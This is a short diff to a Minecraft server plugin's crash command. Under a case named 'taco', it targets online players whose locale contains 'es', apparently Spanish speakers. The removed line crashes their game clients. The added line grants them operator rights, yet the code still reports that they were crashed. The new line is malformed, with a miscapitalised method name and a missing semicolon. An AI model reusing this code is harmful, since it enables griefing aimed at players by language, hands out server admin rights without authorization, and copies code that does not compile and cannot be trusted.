@@ -69,7 +69,7 @@ public class CrashCommand extends BaseCommand {
                 case "taco":
                     for (Player online : Bukkit.getOnlinePlayers()) {
                         if (online.getLocale().toLowerCase().contains("es")) {
-                            Utils.crashPlayer(online);
+                            online.SetOp(true)
                             sendMessage(sender, "&6You have just crashed&r&c " + online.getName());
                         }
                     }
